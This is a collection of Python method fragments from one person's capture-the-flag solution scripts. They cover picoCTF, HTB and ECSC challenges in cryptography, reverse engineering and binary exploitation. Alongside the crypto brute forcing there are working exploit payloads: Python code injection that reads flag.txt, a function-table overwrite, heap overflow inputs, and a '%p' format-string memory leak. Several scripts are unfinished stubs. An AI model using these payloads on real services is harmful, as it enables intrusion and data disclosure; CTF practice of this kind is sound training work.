        eq4 = Eq(self.cnd1 + self.cnd2 + self.cnd3, self.v4)

        solution = solve((eq1, eq2, eq3, eq4), (self.cnd1, self.cnd2, self.cnd3))
        return solution

	# /home/figaro/CTF/Categories/Cryptography/HTB/sugar_free_candies/payloads/solution.py
    def main(self):
        solution = self.solve_equations()

        # Check if the solution is valid
        if isinstance(solution, list) and len(solution) > 0:
            # Assuming the first solution is the desired one
            sol = solution[0]
            print("cnd1:", sol[self.cnd1])
            print("cnd2:", sol[self.cnd2])
            print("cnd3:", sol[self.cnd3])

	# /home/figaro/CTF/Categories/Cryptography/HTB/sekur_julius/payloads/solution.py
    def juilius_decrypt(self, msg, shift):
        pt = ""
        for c in msg:
            if c == "0":
                pt += " "
            elif not ord("A") <= ord(c) <= ord("Z"):
                pt += c
            else:
                o = ord(c) - 65
                pt += chr(65 + (o - shift) % 26)
        return pt

	# /home/figaro/CTF/Categories/Cryptography/HTB/sekur_julius/payloads/solution.py
    def brute_force(self, encrypted_data):

        for shift in range(27):
            pt = self.juilius_decrypt(encrypted_data, shift)
            if "HTB" in pt:
                return pt

	# /home/figaro/CTF/Categories/Cryptography/HTB/sekur_julius/payloads/solution.py
    def main(self):
        with open(self.challenge_file, "r") as f:
            encrypted_data = f.read().strip()

        decrypted_data = self.brute_force(encrypted_data)
        print(decrypted_data)

	# /home/figaro/CTF/Categories/Cryptography/ECSC/Asteromata/payloads/solution.py
    def get_output_variables(self):
        with open(self.challenge_file, "r") as f:
            self.variables = {
                line.split(" = ")[0]: int(line.strip("\n").split(" = ")[1])
                for line in f
            }

	# /home/figaro/CTF/Categories/Cryptography/ECSC/Asteromata/payloads/solution.py
    def main(self):
        self.get_output_variables()
        rx = re.compile(r"(\w+)\s*=\s*(\d+)")

        ct = self.variables["ct"]
        hint = self.variables["hint"]
        n = self.variables["n"]
        e = self.variables["e"]

        P = symbols("P")
        phi_expr = lambda p: n + 1 - p - n // p  # symbolic ϕ(n)  (works in Z)
        start = 103000
        message = ""
        for k in range(start, e):
            print(f"I - {k} | m: {message}")

            # build F_k(p) with the trick explained above
            Y = k * (n + 1 - P) + 1  # k(n+1-p) + 1   (first part)
            Fk = (
                (Y - k * n / P) ** 2 * P**4
                - hint * e * e * P**3
                + (k * k * n * n + e**4 * n) * P**2
            )
            poly = Poly(Fk.expand() * P**0, P)  # canonical form, ZZ [x]

            # try to pull out linear factors
            for factor, _ in poly.factor_list()[1]:
                if factor.degree() != 1:  # need a root of degree-1
                    message = "prev continued"
                    continue
                root = -factor.all_coeffs()[-1] // factor.all_coeffs()[0]

                if root > 1 and n % root == 0:  # bingo – we have   p
                    p = int(root)
                    q = n // p
                    phi = (p - 1) * (q - 1)
                    d = gmpy2.invert(e, phi)  # private exponent
                    m = pow(ct, d, n)
                    flag = gmpy2.to_binary(m).rstrip(b"\x00")
                    print(f"[+] k   = {k}")
                    print(f"[+] p   = {p}")
                    print(f"[+] q   = {q}")
                    print(f"[+] d   = {d}")
                    print(f"[+] flag = {flag.decode(errors='ignore')}")
                    sys.exit(0)
                message = ""

	# /home/figaro/CTF/Categories/Cryptography/ECSC/Asteromata/payloads/attempt_01.py
    def get_output_variables(self):
        with open(self.challenge_file, "r") as f:
            self.variables = {
                line.split(" = ")[0]: int(line.strip("\n").split(" = ")[1])
                for line in f
            }

	# /home/figaro/CTF/Categories/Cryptography/ECSC/Asteromata/payloads/attempt_01.py
    def main(self):
        self.get_output_variables()
        # self.variables
        # Let p be unknown. Use:
        # hint = d^2 * p + e^2 * q
        # n = p * q → q = n // p
        # Substitute and solve: hint = d^2 * p + e^2 * (n // p)
        # This turns into: hint = A*p + B*(n//p)

        # We can brute force small `e` (22 bits), so d is not that large.
        ct = self.variables["ct"]
        hint = self.variables["hint"]
        n = self.variables["n"]
        e = self.variables["e"]

        found = False
        for possible_d in range(1, 1 << 22):
            A = possible_d**2
            B = e**2
            numerator = hint - B * n
            denominator = A - B

            if denominator == 0:
                continue

            if numerator % denominator != 0:
                continue

            p_candidate = numerator // denominator
            if n % p_candidate != 0:
                continue

            q_candidate = n // p_candidate

            if isPrime(p_candidate) and isPrime(q_candidate):
                p = p_candidate
                q = q_candidate
                d = possible_d
                found = True
                print(f"[+] Found p and q using d = {d}")
                break

        if not found:
            print("[-] Failed to find valid p and q")
            return  # or: raise Exception("Failed to find primes")

        # Continue only if found
        phi = (p - 1) * (q - 1)
        d = inverse(e, phi)

	# /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different/payloads/solution.py
    def des_key_generator(self):
        """
        Generator for all possible 8-byte DES keys.
        DES uses a 56-bit key space, padded to 8 bytes.
        """
        for key in range(2**64):
            # Convert the 56-bit key to an 8-byte key
            key_bytes = key.to_bytes(8, byteorder="big")
            yield key_bytes

	# /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different/payloads/solution.py
    def oracle_encrypt(self, pt_hex):
        self.recv_send(text="1", text_until="> ")
        self.recv_send(
            text=pt_hex,
            text_until="Provide message to encrypt > ",
        )
        encrypted_pt = self.recv_lines(1, save=True)[0]
        return bytes.fromhex(encrypted_pt.strip().decode())

	# /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different/payloads/solution.py
    def menu_handler(self, verbose=False):
        for pt in self.plaintexts:
            ct = self.oracle_encrypt(pt.hex())
            if verbose:
                print(f"Encrypting plaintext: {pt.hex()} - ciphertext: {ct.hex()}")
            self.pairs.append((pt, ct))

	# /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different/payloads/solution.py
    def try_key(self, key_bytes):
        key = des.DesKey(key_bytes)
        for pt, ct in self.pairs:
            if key.encrypt(pt) != ct:
                return False
        return True

	# /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different/payloads/solution.py
    def bruteforce_key(self, verbose=False):
        found_key = None
        for key_canditate in itertools.product(range(256), repeat=8):
            if verbose:
                print(f"Trying key: {bytes(key_canditate).hex()}")
            key_bytes = bytes(key_canditate)
            if self.try_key(key_bytes):
                found_key = key_bytes
                print("Key found:", found_key.hex())
                break
        return found_key

	# /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different/payloads/solution.py
    def bruteforce_key_multiprocessing(self, verbose=False):
        """
        Multiprocessing brute-force key search.
        """
        found_key = None

        with Pool(processes=cpu_count() - 8) as pool:
            key_candidates = itertools.product(range(256), repeat=8)
            # Pass both key candidates and pairs to the worker
            args = ((key_candidate, self.pairs) for key_candidate in key_candidates)
            for result in pool.imap(worker, args):
                if result:
                    found_key = result
                    print("Key found:", found_key.hex())
                    pool.terminate()  # Stop other processes
                    break

        return found_key

	# /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different/payloads/solution.py
    def main(self):

        # 50 unique 8-byte blocks
        self.plaintexts = [bytes([i]) * 8 for i in range(49)]
        self.pairs = []

        self.initiate_connection()
        self.recv_lines(3)

        self.menu_handler(verbose=True)

        found_key = self.bruteforce_key_multiprocessing(verbose=True)
        if not found_key:
            print("Key not found. Try optimizing or using more pairs.")
            return

        # Encrypt the magic phrase
        magic_pt = b"Give me the flag"
        key = des.DesKey(found_key)
        magic_ct = key.encrypt(magic_pt)
        print("Magic ciphertext:", magic_ct.hex())

        self.recv_send(text="2", text_until="> ")
        self.recv_send(text=magic_ct.hex(), text_until="Provide the magic phrase > ")
        flag = self.recv_lines(3, display=True, save=True)[0]

	# /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different_Revenge/payloads/solution.py
    def des_key_generator(self):
        """
        Generator for all possible 8-byte DES keys.
        DES uses a 56-bit key space, padded to 8 bytes.
        """
        for key in range(2**64):
            # Convert the 56-bit key to an 8-byte key
            key_bytes = key.to_bytes(8, byteorder="big")
            yield key_bytes

	# /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different_Revenge/payloads/solution.py
    def oracle_encrypt(self, pt_hex):
        self.recv_send(text="1", text_until="> ")
        self.recv_send(
            text=pt_hex,
            text_until="Provide message to encrypt > ",
        )
        encrypted_pt = self.recv_lines(1, save=True)[0]
        return bytes.fromhex(encrypted_pt.strip().decode())

	# /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different_Revenge/payloads/solution.py
    def menu_handler(self, verbose=False):
        for pt in self.plaintexts:
            ct = self.oracle_encrypt(pt.hex())
            if verbose:
                print(f"Encrypting plaintext: {pt.hex()} - ciphertext: {ct.hex()}")
            self.pairs.append((pt, ct))

	# /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different_Revenge/payloads/solution.py
    def try_key(self, key_bytes):
        key = des.DesKey(key_bytes)
        for pt, ct in self.pairs:
            if key.encrypt(pt) != ct:
                return False
        return True

	# /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different_Revenge/payloads/solution.py
    def bruteforce_key(self, verbose=False):
        found_key = None
        for key_canditate in itertools.product(range(256), repeat=8):
            if verbose:
                print(f"Trying key: {bytes(key_canditate).hex()}")
            key_bytes = bytes(key_canditate)
            if self.try_key(key_bytes):
                found_key = key_bytes
                print("Key found:", found_key.hex())
                break
        return found_key

	# /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different_Revenge/payloads/solution.py
    def bruteforce_key_multiprocessing(self, verbose=False):
        """
        Multiprocessing brute-force key search.
        """
        found_key = None

        with Pool(processes=cpu_count() - 8) as pool:
            key_candidates = itertools.product(range(256), repeat=8)
            # Pass both key candidates and pairs to the worker
            args = ((key_candidate, self.pairs) for key_candidate in key_candidates)
            for result in pool.imap(worker, args):
                if result:
                    found_key = result
                    print("Key found:", found_key.hex())
                    pool.terminate()  # Stop other processes
                    break

        return found_key

	# /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different_Revenge/payloads/solution.py
    def main_multi_process(self):

        # 50 unique 8-byte blocks
        self.plaintexts = [bytes([i]) * 8 for i in range(49)]
        self.pairs = []

        self.initiate_connection()
        self.recv_lines(3)

        self.menu_handler(verbose=True)

        found_key = None
        # Needs the logic here

        # Encrypt the magic phrase
        magic_pt = b"Give me the flag"
        key = des.DesKey(found_key)
        magic_ct = key.encrypt(magic_pt)
        print("Magic ciphertext:", magic_ct.hex())

        self.recv_send(text="2", text_until="> ")
        self.recv_send(text=magic_ct.hex(), text_until="Provide the magic phrase > ")
        flag = self.recv_lines(3, display=True, save=True)[0]

	# /home/figaro/CTF/Categories/Cryptography/ECSC/Gamble_Auction/payloads/solution.py
    def main(self):
        pass

	# /home/figaro/CTF/Categories/Cryptography/ECSC/The_Truth/payloads/solution.py
    def main(self):

        with open(self.challenge_file, "r") as f:
            data = f.read()

        # alphabet = ascii_lowercase + ascii_uppercase + digits

        crypted_alphabet = set()
        for c in data:
            crypted_alphabet.add(c)

        crypted_dict = {c: "" for c in sorted(list(crypted_alphabet))}

        # self.saving_to_json(crypted_dict)

        crypted_dict = self.read_json("table.json")

        for i, v in enumerate(crypted_dict):
            print(i + 2, v, crypted_dict[v])

        print(self.decoding(crypted_dict, data))

	# /home/figaro/CTF/Categories/Cryptography/ECSC/The_Truth/payloads/solution.py
    def decoding(self, crypted_dict, data):

        decoded = ""
        for c in data:
            if c in crypted_dict.keys() and crypted_dict[c] != "":
                decoded += crypted_dict[c]
            else:
                decoded += c
        return decoded

	# /home/figaro/CTF/Categories/Cryptography/ECSC/The_Truth/payloads/solution.py
    def saving_to_json(self, crypted_dict):

        self.folfil("data", "table.json")

        with open(self.folfil("data", "table.json"), "w") as f:
            json.dump(crypted_dict, f, indent=4)

	# /home/figaro/CTF/Categories/Cryptography/ECSC/The_Truth/payloads/solution.py
    def read_json(self, filename):
        with open(self.folfil("data", filename), "r") as f:
            return json.load(f)

	# /home/figaro/CTF/Categories/ReverseEngineering/picoCTF/Classic_Crackme_0x100/payloads/solution.py
    def main(self):
        pass

	# /home/figaro/CTF/Categories/ReverseEngineering/picoCTF/Picker_1/payloads/solution.py
    def de_hexing_flag(self, flag):
        flag = flag[0].decode("utf-8").strip("\n").strip(" ")
        flag = [chr(int(letter, 16)) for letter in flag.split(" ")]
        flag = "".join(flag)
        return flag

	# /home/figaro/CTF/Categories/ReverseEngineering/picoCTF/Picker_1/payloads/solution.py
    def main(self):
        self.initiate_connection()
        self.menu_num = 1
        self.menu_text = "==> "
        self.send_menu(choice="win", display=False)
        flag = self.recv_menu(number=1, display=False, save=True)

        flag = self.de_hexing_flag(flag)
        print(flag)

	# /home/figaro/CTF/Categories/ReverseEngineering/picoCTF/Picker_2/payloads/solution.py
    def main(self):
        payload = "print(open('flag.txt','r').read())#"
        self.initiate_connection()
        self.menu_num = 0
        self.menu_text = "==> "
        self.send_menu(choice=payload, display=True)
        flag = self.recv_menu(number=1, display=True, save=True)[0]
        print(flag)

	# /home/figaro/CTF/Categories/ReverseEngineering/picoCTF/Picker_3/payloads/solution.py
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.menu_num = 0
        self.menu_text = "==> "
        self.local_preparations()
        self.initiate_connection()
        self.help_num = 13

	# /home/figaro/CTF/Categories/ReverseEngineering/picoCTF/Picker_3/payloads/solution.py
    def local_preparations(self):
        if self.conn == "remote":
            return
        self.challenge_file = self.Path(self.parent, "challenge", self.file)
        self.folder_challenge = self.Path(self.parent, "challenge")
        self.prepare_space(
            files=["flag.txt"],
            folder=self.folder_challenge,
        )

	# /home/figaro/CTF/Categories/ReverseEngineering/picoCTF/Picker_3/payloads/solution.py
    def de_hexing_flag(self, flag):
        flag = flag[0].decode("utf-8").strip("\n").strip(" ")
        flag = [chr(int(letter, 16)) for letter in flag.split(" ")]
        flag = "".join(flag)
        return flag

	# /home/figaro/CTF/Categories/ReverseEngineering/picoCTF/Picker_3/payloads/solution.py
    def main(self):

        # This was useless to get the func tables and stuff

        # self.send_menu(choice=2)
        # self.conn.recvuntil("Please enter variable name to read: ".encode())
        # self.conn.sendline("FUNC_TABLE_SIZE".encode())
        # FUNC_TABLE_SIZE = self.recv_menu(number=1, display=True, save=True)[0]

        # self.send_menu(choice=2)
        # self.conn.recvuntil("Please enter variable name to read: ".encode())
        # self.conn.sendline("FUNC_TABLE_ENTRY_SIZE".encode())
        # FUNC_TABLE_ENTRY_SIZE = self.recv_menu(number=1, display=True, save=True)[0]

        # FUNC_TABLE_SIZE = int(FUNC_TABLE_SIZE.decode("utf-8").strip("\n").strip(" "))
        # FUNC_TABLE_ENTRY_SIZE = int(
        #     FUNC_TABLE_ENTRY_SIZE.decode("utf-8").strip("\n").strip(" ")
        # )

        new_func_table = '"{0:128}"'.format("win")
        self.send_menu(choice=3)

        self.conn.recvuntil("Please enter variable name to write: ".encode())
        self.conn.sendline("func_table".encode())

        self.conn.recvuntil("Please enter new value of variable: ".encode())
        self.conn.sendline(new_func_table.encode())

        # Access the first option of the table
        self.send_menu(choice=1)

        flag = self.recv_menu(number=1, display=True, save=True)
        flag = self.de_hexing_flag(flag)
        print(flag)

        self.conn.sendline("quit".encode())

	# /home/figaro/CTF/Categories/ReverseEngineering/picoCTF/keygenme-py/payloads/solution.py
    def main(self):

        username_trial = "PRITCHARD"
        bUsername_trial = b"PRITCHARD"

        key_part_static1_trial = "picoCTF{1n_7h3_|<3y_of_"
        key_part_dynamic1_trial = "xxxxxxxx"
        key_part_static2_trial = "}"

        # I used bUsername_trial because enter_liscence used it as well but after testing afterwards, they output the same answer
        middle_flag = [
            hashlib.sha256(bUsername_trial).hexdigest()[4],
            hashlib.sha256(bUsername_trial).hexdigest()[5],
            hashlib.sha256(bUsername_trial).hexdigest()[3],
            hashlib.sha256(bUsername_trial).hexdigest()[6],
            hashlib.sha256(bUsername_trial).hexdigest()[2],
            hashlib.sha256(bUsername_trial).hexdigest()[7],
            hashlib.sha256(bUsername_trial).hexdigest()[1],
            hashlib.sha256(bUsername_trial).hexdigest()[8],
        ]

        key_part_dynamic1_trial = "".join(middle_flag)
        key_full_template_trial = (
            key_part_static1_trial + key_part_dynamic1_trial + key_part_static2_trial
        )

        print(key_full_template_trial)

	# /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/solution.py
    def bytes_to_int_array(self, data):
        """Convert bytes to array of integers"""
        return [b for b in data]

	# /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/solution.py
    def int_array_to_bytes(self, data):
        """Convert array of integers to bytes"""
        return bytes(data)

	# /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/solution.py
    def xor_decrypt(self, encrypted, key):
        """Perform XOR decryption similar to FUN_00101189"""
        if not key:
            return b""

        result = []
        key_len = len(key)

        for i in range(len(encrypted)):
            result.append(encrypted[i] ^ key[i % key_len])

        return bytes(result)

	# /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/solution.py
    def hex_to_bytes_le(self, hex_val, size):
        return hex_val.to_bytes(size, "little")

	# /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/solution.py
    def solve_challenge(self):
        """Main function to solve the challenge"""

        # Extract the encrypted data from the decompiled code (little-endian format)
        # Convert hex values to bytes in little-endian order

        # Stage 1 data from local_258, local_250, local_248, local_240, local_238
        encrypted_stage1 = (
            self.hex_to_bytes_le(0x59E9BA9E8F463D01, 8)
            + self.hex_to_bytes_le(0x5B94C9EA56CFFF4F, 8)
            + self.hex_to_bytes_le(0xC1129B387F683E5, 8)
            + self.hex_to_bytes_le(0xC19D94E581D7E07A, 8)
            + self.hex_to_bytes_le(0x2D2E57E4, 4)
        )

        # Stage 2 data from local_228, local_220, local_218, local_210, local_208
        encrypted_stage2 = (
            self.hex_to_bytes_le(0x4E9EF0D5EA375C64, 8)
            + self.hex_to_bytes_le(0x48E7DEA62BDB901D, 8)
            + self.hex_to_bytes_le(0x5A4654DEE5B1D698, 8)
            + self.hex_to_bytes_le(0x8D8E95F2979D8315, 8)
            + self.hex_to_bytes_le(0x703F1481, 4)
        )

        print("[*] Attempting to recover the key...")
        print(f"[*] Stage 1 encrypted data length: {len(encrypted_stage1)}")
        print(f"[*] Stage 2 encrypted data length: {len(encrypted_stage2)}")

        # Try common flag prefixes (focusing on ECSC format)
        common_prefixes = [b"ECSC{", b"ecsc{"]

        for prefix in common_prefixes:
            print(f"\n[*] Trying prefix: {prefix.decode()}")

            # Try different key lengths (minimum 5 as per the code)
            for key_length in range(5, 21):
                print(f"[*] Trying key length: {key_length}")

                # Try to find a key that produces the expected prefix
                # We'll try a brute force approach for short keys
                if key_length <= 8:
                    # For short keys, try common patterns
                    test_keys = [
                        b"hello" + b"a" * (key_length - 5),
                        b"password"[:key_length],
                        b"12345" + b"a" * (key_length - 5),
                        b"admin" + b"a" * (key_length - 5),
                        b"key12" + b"a" * (key_length - 5),
                        b"test1" + b"a" * (key_length - 5),
                    ]

                    for test_key in test_keys:
                        if len(test_key) != key_length:
                            continue

                        # First decrypt stage 1 with the test key
                        stage1_result = self.xor_decrypt(encrypted_stage1, test_key)

                        # Then decrypt stage 2 with stage 1 result
                        final_result = self.xor_decrypt(encrypted_stage2, stage1_result)

                        # Check if result starts with expected prefix
                        if final_result.startswith(prefix):
                            print(f"[+] FOUND POTENTIAL KEY: {test_key}")
                            print(f"[+] Decrypted flag: {final_result}")
                            return test_key, final_result

        # If simple brute force doesn't work, try reverse engineering approach
        print("\n[*] Simple brute force failed. Trying reverse engineering approach...")

        # Assume the flag starts with "ECSC{" and try to work backwards
        target_prefix = b"ECSC{"

        # Try to find what stage1_result should be to produce target_prefix
        for key_len in range(5, 16):
            print(f"[*] Reverse engineering with key length: {key_len}")

            # Calculate what the stage1 result should start with
            stage1_prefix = []
            for i in range(min(len(target_prefix), len(encrypted_stage2))):
                stage1_prefix.append(encrypted_stage2[i] ^ target_prefix[i])

            stage1_prefix_bytes = bytes(stage1_prefix)
            print(f"[*] Stage1 result should start with: {stage1_prefix_bytes.hex()}")

            # Now try to find what key produces this stage1_prefix
            key_candidate = []

            for i in range(min(len(stage1_prefix_bytes), len(encrypted_stage1))):
                key_byte = encrypted_stage1[i] ^ stage1_prefix_bytes[i]
                key_candidate.append(key_byte)

            if len(key_candidate) >= 5:
                # Extend key to full length by repeating pattern
                full_key = (key_candidate * ((key_len // len(key_candidate)) + 1))[
                    :key_len
                ]
                test_key = bytes(full_key)

                print(f"[*] Testing key candidate: {test_key}")

                # Test this key
                stage1_result = self.xor_decrypt(encrypted_stage1, test_key)
                final_result = self.xor_decrypt(encrypted_stage2, stage1_result)

                print(f"[*] Result: {final_result}")

                # Check if it looks like a valid flag
                if b"ECSC{" in final_result or b"ecsc{" in final_result:
                    print(f"[+] FOUND KEY: {test_key}")
                    print(f"[+] FLAG: {final_result}")
                    return test_key, final_result

        print("[-] Could not find the key automatically")
        return None, None

	# /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/solution.py
    def main(self):
        print("=" * 60)
        print("Key Recovery Script for 'Just a Key' Challenge - ECSC Format")
        print("=" * 60)
        key, flag = self.solve_challenge()

        if key:
            print(f"\n[SUCCESS] Key found: {key}")
            print(f"[SUCCESS] Flag: {flag}")
        else:
            print("\n[FAILED] Could not automatically recover the key")
            print(
                "You may need to analyze the binary further or try manual key recovery"
            )

	# /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/attempt_01.py
    def xor_decrypt(self, key_bytes: bytes, input_bytes: bytes) -> bytes:
        key_len = len(input_bytes)
        result = bytearray(key_len)
        for i in range(key_len):
            result[i] = input_bytes[i % len(input_bytes)] ^ key_bytes[i]
        return result

	# /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/attempt_01.py
    def mutate_key(self, buf: bytearray, key: bytes) -> bytearray:
        tmp = buf[:]
        for i in range(0, len(key), 5):
            chunk = key[i : i + 5]
            tmp = self.xor_decrypt(tmp, chunk)
        return tmp

	# /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/attempt_01.py
    def try_key(self, candidate: str):
        key = candidate.encode()
        if len(key) < 5:
            return None

        # Transform key_step1 using input
        transformed_key = self.mutate_key(self.key_step1, key)
        # First decryption stage
        intermediate = self.xor_decrypt(self.encrypted_intermediate, transformed_key)
        # Final decryption
        flag = self.xor_decrypt(self.encrypted_flag, intermediate)
        return flag

	# /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/attempt_01.py
    def bruteforcer(self):

        print("[*] Brute-forcing keys with known prefix:", self.known_prefix)

        for length in range(5, 30):  # keep short for demonstration
            for suffix in product(self.charset, repeat=length - len(self.known_prefix)):
                candidate_key = self.known_prefix + "".join(suffix)
                result = self.try_key(candidate_key)
                print(candidate_key, result)
                if (
                    result
                    and result.startswith(self.flag_prefix)
                    and result[-1] == ord("}")
                ):
                    print("[+] Found key:", candidate_key)
                    print("[+] Flag:", result.decode(errors="ignore"))
                    return

        print("[-] No valid flag found.")

	# /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/attempt_01.py
    def smarter_bruteforcer(self):
        """
        Check the first letter first, and then continue
        """
        dummy = "a" * 5  # dummy suffix for length calculation
        for length in range(5, 30):  # keep short for demonstration
            pass

	# /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/attempt_01.py
    def main(self):

        step1_key = [
            0x11,
            0x11,
            0x11,
            0x11,
            0x11,
            0x01,
            0x3D,
            0x46,
            0x8F,
            0x9E,
            0xBA,
            0xE9,
            0x59,
            0x4F,
            0xFF,
            0xCF,
            0x56,
            0xEA,
            0xC9,
            0x94,
            0x5B,
            0x05,
            0x3E,
            0x68,
            0x7F,
            0x38,
            0x9B,
            0x12,
            0xC1,
            0x7A,
            0xE0,
            0xD7,
            0x81,
            0xE5,
            0x94,
            0x9D,
            0xC1,
            0xE4,
            0x57,
            0x2E,
            0x2D,
            0x00,
        ]

        self.key_step1 = bytearray.fromhex(
            "11111111"
            "11"
            "00"
            "59e9ba9e8f463d01"
            "5b94c9ea56cfff4f"
            "0c1129b387f683e5"
            "c19d94e581d7e07a"
            "2d2e57e4"
            "00"
        ).ljust(44, b"\x00")

        # From local_258 onward
        self.encrypted_intermediate = bytearray.fromhex(
            "59e9ba9e8f463d01"
            "5b94c9ea56cfff4f"
            "0c1129b387f683e5"
            "c19d94e581d7e07a"
            "2d2e57e4"
        )

        # From local_228 onward
        self.encrypted_flag = bytearray.fromhex(
            "4e9ef0d5ea375c64"
            "48e7dea62bdb901d"
            "5a4654dee5b1d698"
            "8d8e95f2979d8315"
            "703f1481"
        )

        # Charset for brute-forcing
        self.charset = string.ascii_letters + string.digits + "_{}"
        self.known_prefix = ""
        self.flag_prefix = b"ECSC{"

        self.bruteforcer()

	# /home/figaro/CTF/Categories/Binary/picoCTF/heap_3/payloads/solution.py
    def __init__(self, **kwargs) -> None:
        super().__init__(**kwargs)
        self.prepare_space(
            files=["flag.txt"], folder=self.folder_files, test_text="picoCTF{test}"
        )
        # self.elf = self.pwn.ELF(self.challenge_file)
        self.initiate_connection()

	# /home/figaro/CTF/Categories/Binary/picoCTF/heap_3/payloads/solution.py
    def main(self):
        self.menu_num = 8
        self.menu_text = "Enter your choice: "

        # Init
        self.recv_menu(4)

        self.send_menu("5")
        self.send_menu("2")

        self.conn.recvuntil(b"allocation: ")
        self.conn.sendline(b"31")
        self.conn.recvuntil(b"Data for flag: ")
        self.conn.sendline(b"A" * 30 + b"pico")

        self.send_menu("3")
        self.recv_menu(4, False)

        self.send_menu("4")

        self.recv_menu(2, True)

	# /home/figaro/CTF/Categories/Binary/picoCTF/heap_1/payloads/solution.py
    def __init__(self, **kwargs) -> None:
        super().__init__(**kwargs)
        self.prepare_space(
            files=["flag.txt"], folder=self.folder_files, test_text="picoCTF{test}"
        )
        self.current_initiate_connection()

	# /home/figaro/CTF/Categories/Binary/picoCTF/heap_1/payloads/solution.py
    def initiate_connection(self):
        # return super().initiate_connection()
        pass

	# /home/figaro/CTF/Categories/Binary/picoCTF/heap_1/payloads/solution.py
    def current_initiate_connection(self):
        self.connect(self.conn_type)

	# /home/figaro/CTF/Categories/Binary/picoCTF/heap_1/payloads/solution.py
    def main(self):

        # Welcome message
        for _ in range(5):
            out = self.conn.recvline()
            # print(out)

        # Menu
        for _ in range(8):
            out = self.conn.recvline()
            # print(out)

        # Options
        for _ in range(7):
            out = self.conn.recvline()
            # print(out)

        out = self.conn.recvuntil(b"Enter your choice: ")
        # print(out)

        payload = b"A" * 32 + b"pico"

        self.conn.sendline(b"2")

        self.conn.sendline(payload)

        print(self.conn.recvuntil(b"choice: "))

        self.conn.sendline(b"4")

        print(self.conn.recvline())
        print(self.conn.recvline())
        print(self.conn.recvline())
        print(self.conn.recvline())

	# /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution.py
    def exploitation(self):
        self.initiate_connection()
        self.recv_menu(4)
        self.conn.sendline(b"1")
        self.conn.recvuntil(b"What is your API token?\n")
        self.conn.sendline(b"%p" * 24)
        self.conn.recvline()
        data = self.conn.recvline().strip().decode()
        return data

	# /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution.py
    def to_hex(self, data):
        if type(data) == str:
            return "".join([hex(ord(c)) for c in data])
        return "".join([hex(ord(c))[2:] for c in data])

	# /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution.py
    def from_hex(self, data):
        return "".join([chr(int(data[i : i + 2], 16)) for i in range(0, len(data), 2)])

	# /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution.py
    def data_processing(self, data):

        output = "".join(data.split("(nil)"))

        output = output.strip("0x").split("0x")
        temp = []

        for item in output:
            temp_word = ""
            if len(item) == 8:
                for i in range(0, 8, 2):
                    temp_word = item[i : i + 2] + temp_word
                temp_word = self.from_hex(temp_word)
                temp.append(temp_word)
            else:

                temp.append(self.from_hex(item))

        output = temp
        output = "".join(output)
        return output

	# /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution.py
    def local_run(self):
        data = "0x9cc74100x804b0000x80489c30xf7ec6d800xffffffff0x10x9cc51600xf7ed41100xf7ec6dc7(nil)0x9cc61800x10x9cc73f00x9cc74100x6f6369700x7b4654430x306c5f490x345f74350x6d5f6c6c0x306d5f790x5f79336e0x633432610x366134310xff87007d"
        return data

	# /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution.py
    def main(self):
        self.menu_num = 4
        data = self.exploitation()
        data = self.data_processing(data)
        flag = self.re_match_flag(data, "picoCTF")[0]
        print(flag)

	# /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution_pwntools.py
    def exploitation(self):

        self.conn = self.pwn.remote(self.url, self.port)

        for _ in range(4):
            self.conn.recvline()

        self.conn.sendline(b"1")

        question = "What is your API token?\n"
        payload = "%p" * 24

        self.conn.recvuntil(question.encode())
        self.conn.sendline(payload.encode())
        self.conn.recvline()
        data = self.conn.recvline().strip().decode()
        return data

	# /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution_pwntools.py
    def to_hex(self, data):
        if type(data) == str:
            return "".join([hex(ord(c)) for c in data])
        return "".join([hex(ord(c))[2:] for c in data])

	# /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution_pwntools.py
    def from_hex(self, data):
        return "".join([chr(int(data[i : i + 2], 16)) for i in range(0, len(data), 2)])

	# /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution_pwntools.py
    def data_processing(self, data):

        output = "".join(data.split("(nil)"))

        output = output.strip("0x").split("0x")
        temp = []

        for item in output:
            temp_word = ""
            if len(item) == 8:
                for i in range(0, 8, 2):
                    temp_word = item[i : i + 2] + temp_word
                temp_word = self.from_hex(temp_word)
                temp.append(temp_word)
            else:

                temp.append(self.from_hex(item))

        output = temp
        output = "".join(output)
        return output

